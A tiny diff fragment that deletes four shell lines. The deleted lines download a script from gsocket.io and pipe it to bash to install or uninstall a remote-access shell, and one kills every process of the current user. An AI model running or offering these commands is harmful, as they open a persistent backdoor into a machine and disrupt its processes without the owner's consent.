@@ -1,4 +1,0 @@
-GS_UNDO=1 bash -c "$(curl -fsSL
-https://gsocket.io/y)"
-pkill -u $(whoami)
-bash -c "$(curl -fsSL https://gsocket.io/y)"
